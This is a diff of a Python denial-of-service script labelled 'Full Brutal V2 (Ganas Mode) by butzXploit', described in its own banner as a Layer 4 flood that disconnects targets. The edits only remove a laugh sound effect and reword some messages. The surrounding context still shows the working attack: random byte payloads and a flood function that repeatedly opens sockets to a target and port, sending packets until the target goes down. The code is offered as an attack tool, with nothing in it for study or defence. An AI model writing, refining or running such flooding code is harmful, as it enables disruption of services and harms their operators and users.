@@ -1,7 +1,6 @@
 # -*- coding: utf-8 -*-
-# Full Brutal V2 (Ganas Mode) by butzXploit
+# Full Brutal V2 (Ganas Mode No Sound) by butzXploit
 import os, threading, socket, random, time
-from playsound import playsound
 
 os.system("clear")
 print('''
@@ -10,11 +9,6 @@ print('''
 ║   \x1b[1;93mFlood Auto-Disconnect Target | Layer 4 Extreme   ║
 ╚═════════════════════════════════════════════════╝\x1b[0m
 ''')
-
-try:
-    playsound("laugh.mp3", block=False)
-except:
-    print("[!] Efek suara gagal (laugh.mp3 tidak ditemukan)")
 
 payloads = [
     random._urandom(1024),
@@ -35,7 +29,7 @@ def flood(target, port):
             print(f"\x1b[1;92m[✓] Sent brutal packet to {target}:{port}\x1b[0m")
             s.close()
         except socket.error:
-            print(f"\x1b[1;91m[-] Target {target} down or connection refused\x1b[0m")
+            print(f"\x1b[1;91m[-] Target {target} DOWN or BLOCKED!\x1b[0m")
             break
         except:
             pass
